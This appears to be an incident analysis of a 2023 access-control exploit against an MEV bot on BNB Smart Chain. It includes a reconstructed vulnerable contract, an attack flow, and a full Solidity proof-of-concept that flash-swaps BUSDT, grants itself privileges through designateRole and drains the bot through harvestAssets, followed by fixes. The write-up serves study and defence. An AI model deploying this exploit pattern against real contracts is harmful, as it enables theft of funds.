# MEV Bot 0x8c2d Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | MEV Bot (0x8c2d) |
| Date | 2023-11-18 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$365,000 USD (BUSDT) |
| Attack Type | Flash Loan + designateRole + harvestAssets |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x69e068eb917115ed103278b812ec7541f021cea0` |
| Attack Contract | `0x3918e0d26b41134c006e8d2d7e3206a53b006108` |
| Vulnerable Contract | `0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7` (MEV Bot) |
| Fork Block | 33,435,892 |

## 2. Vulnerability Code Analysis

The MEV bot contract (`0x8c2d`) granted privileges via a `designateRole()` function that accepted a timestamp and chain ID as parameters, and allowed asset transfers via a `harvestAssets()` function. Privileges were granted using only a timestamp+chainId combination with no signature verification, allowing an attacker to compute and reproduce these values within the same block.

```solidity
// Vulnerable pattern: timestamp+chainId based weak privilege granting
contract MEVBot {
    mapping(address => bool) public privileged;

    // Vulnerable: grants privileges based on block.timestamp + chainId — manipulable
    function designateRole(
        uint256 amount,
        uint8 v,
        uint256 timeAndChain, // (timestamp << 96) | (chainId << 64)
        uint8 r_val,
        address token,
        uint8 s_val,
        uint8 extra,
        address recipient
    ) external {
        // Grants privilege based solely on time/chain parameters without signature verification
        uint256 expectedTime = block.timestamp + 1;
        uint256 expected = (expectedTime << 96) | (chainId << 64);
        if (timeAndChain == expected) {
            privileged[recipient] = true; // Attacker sets recipient to themselves
        }
    }

    function harvestAssets(
        uint256 amount, uint8 v, uint256 timeAndChain,
        uint8 r_val, address token, uint8 s_val, uint8 extra,
        address from, address to, uint8 extra2
    ) external {
        require(privileged[msg.sender], "Not privileged");
        IERC20(token).transferFrom(from, to, IERC20(token).balanceOf(from));
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + designateRole + harvestAssets
// Source code unverified — analysis based on bytecode
```

**Vulnerability**: The `designateRole()` function granted privileges by accepting `block.timestamp + 1` and `chainId` as parameters with no actual signature verification. The attacker computed these values inside a flash loan callback, registered themselves as a privileged address, and then drained the bot's BUSDT via `harvestAssets()`.

## 3. Attack Flow

```
Attacker [0x69e068eb917115ed103278b812ec7541f021cea0]
  │
  ├─1─▶ WBNB_BUSDT.swap(BUSDT balance of victim, 0, address(this), data)
  │      [WBNB_BUSDT Pair: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]
  │      Flash swap to borrow BUSDT equal to the victim bot's balance
  │      Triggers pancakeCall callback
  │
  ├─2─▶ BUSDT.approve(assetHarvestingContract, max)
  │      [assetHarvestingContract: 0x19a23DdAA47396335894229E0439D3D187D89eC9]
  │
  ├─3─▶ designateRole(
  │          BUSDT.balance,
  │          0,
  │          (block.timestamp+1 << 96) | (chainId << 64),
  │          0, BUSDT, 0, 0,
  │          address(this)  ← registers attacker as privileged
  │      )
  │      [MEV Bot: 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7]
  │      selector 0xac3994ec
  │
  ├─4─▶ harvestAssets(
  │          BUSDT.balance, 0,
  │          (block.timestamp+1 << 96) | (chainId << 64),
  │          0, BUSDT, 0, 0,
  │          victimMevBot,  ← from victim bot
  │          address(this), ← to attacker
  │          0
  │      )
  │      selector 0x1270d364
  │      → Drains victim bot's entire BUSDT balance
  │
  └─5─▶ Repays flash swap + realizes ~$365,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract MEVBotExploit {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair WBNB_BUSDT = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    address victimMevBot = 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
    address assetHarvestingContract = 0x19a23DdAA47396335894229E0439D3D187D89eC9;

    function testExploit() public {
        bytes memory data = abi.encode(assetHarvestingContract, victimMevBot);
        WBNB_BUSDT.swap(BUSDT.balanceOf(victimMevBot), 0, address(this), data);
    }

    function pancakeCall(address, uint256 _amount0, uint256, bytes calldata _data) external {
        BUSDT.approve(assetHarvestingContract, type(uint256).max);

        uint256 currentTimePlusOne = block.timestamp + 1;
        uint256 chainId;
        assembly { chainId := chainid() }

        // designateRole: register attacker as privileged
        (bool success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0xac3994ec),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (currentTimePlusOne << 96) | ((chainId << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0), uint8(0),
                address(this)
            )
        );
        require(success, "designateRole failed");

        // harvestAssets: drain victim bot's assets
        (success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0x1270d364),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (currentTimePlusOne << 96) | ((chainId << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0), uint8(0),
                victimMevBot,
                address(this),
                uint8(0)
            )
        );
        require(success, "harvestAssets failed");

        BUSDT.approve(assetHarvestingContract, 0);
        uint256 repayAmount = 1 + (3 * _amount0) / 997 + _amount0;
        BUSDT.transfer(address(WBNB_BUSDT), repayAmount);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Timestamp+chainId based weak privilege granting, no signature verification |
| Impact Scope | Full BUSDT balance held by MEV Bot |
| Explorer | [BSCscan](https://bscscan.com/address/0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7) |

## 6. Security Recommendations

```solidity
// Fix 1: Grant privileges via ECDSA signature verification
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

address public trustedSigner;

function designateRole(address recipient, bytes calldata signature) external {
    bytes32 messageHash = keccak256(abi.encodePacked(recipient, block.chainid));
    bytes32 ethSignedHash = ECDSA.toEthSignedMessageHash(messageHash);
    address signer = ECDSA.recover(ethSignedHash, signature);
    require(signer == trustedSigner, "Invalid signature");
    privileged[recipient] = true;
}

// Fix 2: Remove timestamp-based parameters
// block.timestamp can be partially manipulated by miners/validators
// and must not be used for access control verification

// Fix 3: Multisig or hardcoded privileged addresses
mapping(address => bool) private immutablePrivileged;

constructor(address[] memory _privileged) {
    for (uint i = 0; i < _privileged.length; i++) {
        immutablePrivileged[_privileged[i]] = true;
    }
}
```

## 7. Lessons Learned

1. **Timestamp-based access control**: Using `block.timestamp` as a condition for granting privileges is extremely dangerous. `block.timestamp + 1` is predictable within the same block, making it reproducible by an attacker.
2. **MEV bot security**: MEV bots frequently hold large sums of funds, making access control vulnerabilities critical. Privilege-granting logic must always use cryptographic signature verification (ECDSA).
3. **Privilege hijacking via flash loan**: The pattern of borrowing a flash loan equal to the victim bot's balance to satisfy a privilege condition is creative. When privilege-granting logic is coupled to held balances, this class of attack becomes possible.
4. **Separation of assetHarvestingContract**: The asset harvesting contract was deployed separately from the bot body, yet the same attack succeeded due to weak privilege verification. Separation alone does not guarantee security.